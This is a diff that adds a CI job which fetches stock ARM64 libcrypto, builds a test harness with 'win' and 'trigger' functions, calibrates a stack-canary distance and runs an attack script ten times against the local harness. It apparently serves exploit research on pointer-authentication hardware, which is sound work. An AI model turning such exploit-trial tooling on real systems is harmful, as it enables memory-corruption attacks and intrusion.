@@ -205,3 +205,57 @@ jobs:
         with:
           name: synthetic-oracle-results
           path: results/
+
+  libcrypto-oracle:
+    runs-on: ubuntu-24.04-arm
+    timeout-minutes: 60
+    steps:
+      - uses: actions/checkout@v4
+      - name: system info
+        run: |
+          mkdir -p results
+          uname -a | tee results/system.txt
+          lscpu | tee -a results/system.txt
+          (grep -o paca /proc/cpuinfo | head -1 | tee -a results/system.txt) || true
+      - name: fetch stock libcrypto 3.0.13-0ubuntu3
+        run: |
+          curl -fsSL -o /tmp/libssl3t64.deb \
+            "https://ports.ubuntu.com/ubuntu-ports/pool/main/o/openssl/libssl3t64_3.0.13-0ubuntu3_arm64.deb"
+          dpkg-deb -x /tmp/libssl3t64.deb libcrypto-stock
+          sha256sum libcrypto-stock/usr/lib/aarch64-linux-gnu/libcrypto.so.3 | tee results/libcrypto.txt
+          objdump -d --start-address=0x1d26b0 --stop-address=0x1d26c0 \
+            libcrypto-stock/usr/lib/aarch64-linux-gnu/libcrypto.so.3 | tee results/offset.txt
+      - name: build harness
+        run: |
+          gcc -O0 -g -fno-omit-frame-pointer -fstack-protector-strong \
+            -fno-optimize-sibling-calls -no-pie -mbranch-protection=pac-ret+bti \
+            -o libcrypto/harness libcrypto/harness.c -ldl -lcrypto
+          file libcrypto/harness | tee results/build.txt
+          nm libcrypto/harness | grep -E ' (win|trigger)$' | tee -a results/build.txt
+      - name: calibrate
+        run: |
+          LD_LIBRARY_PATH="$PWD/libcrypto-stock/usr/lib/aarch64-linux-gnu" \
+            ./libcrypto/harness --calibrate 2>&1 | tee results/calibrate.txt
+      - name: 10 trials
+        run: |
+          set -u
+          D=$(awk -F= '/canary_distance/{print $2}' results/calibrate.txt)
+          WIN=$(nm libcrypto/harness | awk '/ win$/{print $1}')
+          echo "D=$D WIN=0x$WIN"
+          for i in $(seq 1 10); do
+            port=$((12000+i))
+            LD_LIBRARY_PATH="$PWD/libcrypto-stock/usr/lib/aarch64-linux-gnu" \
+              ./libcrypto/harness "$port" >"results/server-$i.log" 2>&1 &
+            pid=$!
+            sleep 0.5
+            echo "===== TRIAL $i ====="
+            timeout 300 python3 libcrypto/attack.py "$port" "0x$WIN" "$D" 2>&1 | tee -a results/attack.log || true
+            kill "$pid" 2>/dev/null || true
+            pkill -f "libcrypto/harness $port" 2>/dev/null || true
+            sleep 0.3
+          done
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: libcrypto-oracle-results
+          path: results/
